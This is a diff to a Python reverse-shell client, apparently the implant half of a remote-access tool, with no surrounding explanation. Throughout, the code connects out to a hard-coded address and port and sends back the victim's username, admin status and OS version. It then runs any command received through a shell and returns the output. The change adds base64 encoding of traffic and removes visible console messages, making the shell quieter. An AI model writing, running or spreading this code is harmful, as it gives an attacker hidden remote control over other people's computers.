@@ -1,70 +1,68 @@
 import socket
 import subprocess
 import os
-import sys
+import base64
 import ctypes
+import platform
+import time
 
-#inbound function
 def inbound():
-    print('[+] Awaiting response... ')
     message = ''
     while True:
         try:
             message = sock.recv(1024).decode()
-            return message
+            message = base64.b64decode(message)
+            message = message.decode().strip()
+            return (message)
         except Exception:
             sock.close()
 
 def outbound(message):
-    response = str(message).encode()
+    response = str(message)
+    response = base64.b64encode(bytes(response, encoding='utf8'))
     sock.send(response)
 
-
-
-# Session Handler Function
 def session_handler():
-    print(f'[+] Connecting to {host_ip} ')
-    sock.connect((host_ip, host_port))
-    outbound(os.getlogin())
-    outbound(ctypes.windll.shell32.IsUserAnAdmin())
-    print(f'[+] Connected to {host_ip}. ')
-    while True:
-        message = inbound()
-        print(f'[+] Message received - {message}')
-        if message == 'exit':
-            print('[-] The server has terminated the session.')
-            sock.close()
-            break
-        elif message.split(" ")[0] == 'cd':
-            try:
-                directory = str(message.split(" ")[1])
-                os.chdir(directory)
-                cur_dir = os.getcwd()
-                print(f'[+] Changed to {cur_dir}')
-                outbound(cur_dir)
-            except FileNotFoundError:
-                outbound('Invalid directory. Try again.')
-                continue
-        elif message == 'background':
-            pass
-        else:
-            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output = command.stdout.read() + command.stderr.read()
-            outbound(output.decode())
-
-
-
-if __name__ == '__main__':  
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        #host_ip = sys.argv[1]
-        #host_port = int(sys.argv[2])
-        host_ip = '192.168.1.103'
-        host_port = 2222
-        session_handler()
-    except IndexError:
-        print('[-] Command line argument(s) missing.  Please try again.')
-    except Exception as e:
-        print(e)
-        
+        sock.connect((host_ip, host_port))
+        outbound(os.getlogin())
+        outbound(ctypes.windll.shell32.IsUserAnAdmin)
+        time.sleep(1)
+        op_sys = platform.uname()
+        op_sys = (f'{op_sys[0]} {op_sys[2]}')
+        outbound(op_sys)
+        while True:
+            message = inbound()
+            if message == 'exit':
+                sock.close()
+                break
+            elif message == 'persist':
+                pass
+            elif message.split(" ")[0] == 'cd':
+                try:
+                    directory = str(message.split(" ")[1])
+                    os.chdir(directory)
+                    cur_dir = os.getcwd()
+                    outbound(cur_dir)
+                except FileNotFoundError:
+                    outbound('Invalid directory. Try again.')
+                    continue
+            elif message == 'background':
+                pass
+            elif message == 'help':
+                pass
+            else:
+                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
+                output = command.stdout.read() + command.stderr.read()
+                outbound(output.decode())
+    except ConnectionRefusedError:
+        pass
+
+if __name__ == '__main__':
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    host_ip = '192.168.1.103'
+    host_port = 2222
+    session_handler()
+
+
 
